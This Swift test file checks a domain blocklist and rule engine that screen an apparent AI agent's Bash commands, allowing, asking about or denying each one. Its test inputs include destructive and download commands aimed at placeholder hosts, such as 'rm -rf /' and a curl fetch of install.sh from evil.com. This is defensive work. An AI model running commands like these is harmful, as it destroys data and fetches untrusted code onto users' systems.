import XCTest
@testable import CompanionCore

final class BlocklistTests: XCTestCase {
    // MARK: URL extraction
    func testExtractsHostsFromCommands() {
        XCTAssertEqual(URLExtractor.hosts(in: "curl https://evil.com/x && ls"), ["evil.com"])
        XCTAssertEqual(URLExtractor.hosts(in: "wget http://a.b.evil.co.uk/p"), ["a.b.evil.co.uk"])
        XCTAssertEqual(URLExtractor.hosts(in: "echo hello world"), [])
        XCTAssertEqual(URLExtractor.hosts(in: "curl A.Evil.COM"), ["a.evil.com"]) // lowercased
    }

    // MARK: Blocklist lookup
    func testLookupExactAndParentDomain() {
        let bl = Blocklist(entries: ["evil.com": .malicious, "hacked.org": .compromised])
        XCTAssertEqual(bl.lookup("evil.com"), .malicious)
        XCTAssertEqual(bl.lookup("sub.deep.evil.com"), .malicious)  // parent match
        XCTAssertEqual(bl.lookup("hacked.org"), .compromised)
        XCTAssertNil(bl.lookup("good.com"))
        XCTAssertNil(bl.lookup("notevil.com"))                      // not a parent of evil.com
    }

    func testLoadFromFile() throws {
        let dir = NSTemporaryDirectory() + "cc-bl-\(UUID().uuidString)"
        try FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(atPath: dir) }
        let path = dir + "/blocklist.db"
        try "evil.com\tmalicious\nhacked.org\tcompromised\nbare.net\n".write(toFile: path, atomically: true, encoding: .utf8)
        let bl = try XCTUnwrap(Blocklist.load(path: path))
        XCTAssertEqual(bl.count, 3)
        XCTAssertEqual(bl.lookup("evil.com"), .malicious)
        XCTAssertEqual(bl.lookup("hacked.org"), .compromised)
        XCTAssertEqual(bl.lookup("bare.net"), .malicious) // no class → defaults malicious
    }

    // MARK: Engine integration
    private func bash(_ c: String) -> HookPayload {
        HookPayload(hookEventName: "PreToolUse", toolName: "Bash", toolInput: ToolInput(command: c))
    }
    private let rules = CompiledRules(
        autoAccept: true,
        deny: [Rule(tool: "Bash", commandRegex: #"\brm\s+-rf\s+/"#)],
        ask:  [Rule(tool: "Bash", commandRegex: #"\bgit\s+push\b"#)]
    )
    private let bl = Blocklist(entries: ["evil.com": .malicious, "hacked.org": .compromised])

    func testMaliciousDomainDenied() {
        let e = RuleEngine.evaluate(bash("curl https://evil.com/install.sh -o x"), rules: rules, blocklist: bl)
        XCTAssertEqual(e.decision, .deny)
        XCTAssertEqual(e.ruleMatched, "blocklist:evil.com")
    }

    func testCompromisedDomainAsks() {
        let e = RuleEngine.evaluate(bash("curl https://hacked.org/page"), rules: rules, blocklist: bl)
        XCTAssertEqual(e.decision, .ask)
    }

    func testCleanDomainAllowed() {
        XCTAssertEqual(RuleEngine.evaluate(bash("curl https://github.com/x"), rules: rules, blocklist: bl).decision, .allow)
    }

    func testRegexDenyBeatsBlocklist() {
        // command hits both a deny regex and a (compromised) domain → deny wins (evaluated first)
        let e = RuleEngine.evaluate(bash("rm -rf / ; curl https://hacked.org"), rules: rules, blocklist: bl)
        XCTAssertEqual(e.decision, .deny)
    }

    func testNoBlocklistMeansNoURLChecks() {
        XCTAssertEqual(RuleEngine.evaluate(bash("curl https://evil.com/x"), rules: rules, blocklist: nil).decision, .allow)
    }
}
